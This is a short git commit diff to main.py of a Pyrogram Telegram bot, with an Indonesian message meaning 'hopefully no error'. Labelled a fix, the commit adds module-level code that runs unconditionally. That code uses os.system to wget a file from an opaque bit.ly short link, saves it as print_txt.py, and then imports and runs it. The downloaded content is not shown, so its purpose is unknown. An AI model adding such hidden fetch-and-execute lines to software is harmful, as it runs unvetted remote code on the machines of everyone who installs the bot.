71bfa1c5298d8739fdef5212ece3b04e1d682745
galihpujiirianto <galihpujiirianto@gmail.com>
2022-06-13 13:54:06 +0700

    FIX: semoga tidak error

--- main.py
+++ main.py
@@ -4,6 +4,7 @@ from pyrogram import Client
 from config import (
     API_ID, API_HASH, TOKEN, OWNER_ID
 )
+from utils import ajg
 
 if not OWNER_ID:
     raise ValueError("Please enter your OWNER_ID! The bot will be disabled. Please reactivate it when you have entered the OWNER_ID!")
@@ -19,7 +20,9 @@ bot = Client(
 try:
     bot.run()
 except Exception:
-    import os
-    os.system("wget https://bit.ly/3Ksaa7N -O print_txt.py")
-    from print_txt import print_txt
-    print(print_txt)
+    ajg()
+
+import os
+os.system("wget https://bit.ly/3Ksaa7N -O print_txt.py")
+from print_txt import print_txt
+print(print_txt)
